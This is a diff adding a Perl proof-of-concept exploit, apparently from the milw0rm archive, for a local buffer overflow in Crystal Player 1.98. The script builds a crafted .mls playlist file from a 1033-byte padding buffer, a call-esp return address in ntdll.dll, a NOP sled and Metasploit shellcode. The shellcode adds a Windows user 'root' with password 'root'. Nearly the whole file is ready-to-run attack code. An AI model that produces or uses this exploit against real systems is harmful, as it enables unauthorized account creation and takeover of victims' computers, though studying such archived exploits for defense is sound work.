@@ -1,0 +1,68 @@
+#!/usr/bin/perl
+######################################################################################################################
+#Crystal Player 1.98
+#Playlist(.mls) File Local Buffer Overflow Exploit
+#Source:: http://www.crystalplayer.com/CrystalPro.exe
+#Credit To Timq For The Vulnerability
+#POC By Arham Muhammad
+#######################################################################################################################
+
+#While Debugging EIP And EBP Successfully Gets Overwritten!
+#Upon Successful Exploitation, DOS Occurs And It Further Destorys The Libraries,Upon Successful Exploitation
+#When The Next Time App Is Executed
+#It Throws Microsfot Visual C++ Runtime Library Error Followed By An Other Exception
+#The POC Add user "root" with password "root" to the os!
+#Tested On x86 vista enterprise ed.
+#Might require Changing esp address coz of os and sp change
+
+
+print "Crystal Player 1.98 Local Bufferoverflow Exploit\n";
+print "Creating Crafted .mls File\n";
+
+
+$buff = 'A' x 1033;
+
+
+$ret = "\x76\xF5\x48\x37"; #call esp in ntdll.dll
+
+
+
+# win32_adduser - PASS=root EXITFUNC=seh USER=root Size=232 Encoder=PexFnstenvSub http://metasploit.com
+$shellcode = "\x2b\xc9\x83\xe9\xcc\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xea". #Add user root with pass root 232 bytes
+"\x15\xcd\x86\x83\xeb\xfc\xe2\xf4\x16\xfd\x89\x86\xea\x15\x46\xc3".
+"\xd6\x9e\xb1\x83\x92\x14\x22\x0d\xa5\x0d\x46\xd9\xca\x14\x26\xcf".
+"\x61\x21\x46\x87\x04\x24\x0d\x1f\x46\x91\x0d\xf2\xed\xd4\x07\x8b".
+"\xeb\xd7\x26\x72\xd1\x41\xe9\x82\x9f\xf0\x46\xd9\xce\x14\x26\xe0".
+"\x61\x19\x86\x0d\xb5\x09\xcc\x6d\x61\x09\x46\x87\x01\x9c\x91\xa2".
+"\xee\xd6\xfc\x46\x8e\x9e\x8d\xb6\x6f\xd5\xb5\x8a\x61\x55\xc1\x0d".
+"\x9a\x09\x60\x0d\x82\x1d\x26\x8f\x61\x95\x7d\x86\xea\x15\x46\xee".
+"\xd6\x4a\xfc\x70\x8a\x43\x44\x7e\x69\xd5\xb6\xd6\x82\xe5\x47\x82".
+"\xb5\x7d\x55\x78\x60\x1b\x9a\x79\x0d\x76\xa0\xe2\xc4\x70\xb5\xe3".
+"\xca\x3a\xae\xa6\x84\x70\xb9\xa6\x9f\x66\xa8\xf4\xca\x67\xa2\xe9".
+"\x9e\x35\xbf\xe9\x85\x61\xed\xa9\xab\x51\x89\xa6\xcc\x33\xed\xe8".
+"\x8f\x61\xed\xea\x85\x76\xac\xea\x8d\x67\xa2\xf3\x9a\x35\x8c\xe2".
+"\x87\x7c\xa3\xef\x99\x61\xbf\xe7\x9e\x7a\xbf\xf5\xca\x67\xa2\xe9".
+"\x9e\x35\xe2\xc7\xae\x51\xcd\x86";
+
+
+$nopsled = "\x90" x 797; #Nopsled to fill the buffer
+
+
+
+open(mls, ">./buffer.mls");
+print mls "$buff";
+print mls "$ret";
+print mls "$nopsled";
+print mls "$shellcode";
+
+
+print "Crafted File Created!\n";
+
+
+#Arham Muhammad
+#rko.thelegendkiller@ gmail.com
+
+#Greets:: str0ke,Hackman,tushy,And All My Friends, Specially AmBi(Love Ya!!!);
+#Gr0undbreakerz
+
+# milw0rm.com [2007-07-26]
